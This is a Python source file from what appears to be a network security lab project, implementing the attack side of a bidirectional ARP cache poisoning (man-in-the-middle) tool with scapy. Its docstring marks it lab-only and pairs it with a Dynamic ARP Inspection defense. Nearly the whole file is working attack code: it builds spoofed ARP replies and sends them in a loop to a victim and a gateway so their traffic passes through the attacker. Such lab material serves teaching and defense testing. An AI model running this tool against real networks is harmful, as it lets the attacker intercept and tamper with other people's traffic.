# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-arp: bidirectional ARP cache poisoning (MITM). LAB ONLY.

Sends gratuitous ARP replies so the victim believes the attacker is the gateway
and the gateway believes the attacker is the victim - all traffic then transits
the attacker. This is exactly what Dynamic ARP Inspection (see dai.py) drops.
"""

from __future__ import annotations

import argparse
import time
from typing import Any

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


class ArpPoisoner:
    def __init__(self, iface: str, victim_ip: str, gateway_ip: str) -> None:
        scapy = load_scapy()
        self._scapy = scapy
        self.iface = iface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = scapy.get_if_hwaddr(iface)

    def _poison(self, target_ip: str, spoofed_ip: str) -> Any:
        s = self._scapy
        # op=2 (reply): "spoofed_ip is at attacker_mac", sent to target_ip
        return s.Ether(src=self.attacker_mac) / s.ARP(
            op=2, psrc=spoofed_ip, hwsrc=self.attacker_mac, pdst=target_ip
        )

    def run(self, interval: float) -> None:
        s = self._scapy
        print(
            f"[*] poisoning {self.victim_ip} <-> {self.gateway_ip} via {self.iface} "
            f"(attacker={self.attacker_mac}). Ctrl-C to stop."
        )
        try:
            while True:
                s.sendp(self._poison(self.victim_ip, self.gateway_ip), iface=self.iface, verbose=0)
                s.sendp(self._poison(self.gateway_ip, self.victim_ip), iface=self.iface, verbose=0)
                verdict("ALERT", f"told {self.victim_ip} that {self.gateway_ip} is me")
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[*] stopped.")


def run(args: argparse.Namespace) -> int:
    ArpPoisoner(args.iface, args.victim, args.gateway).run(args.interval)
    return 0
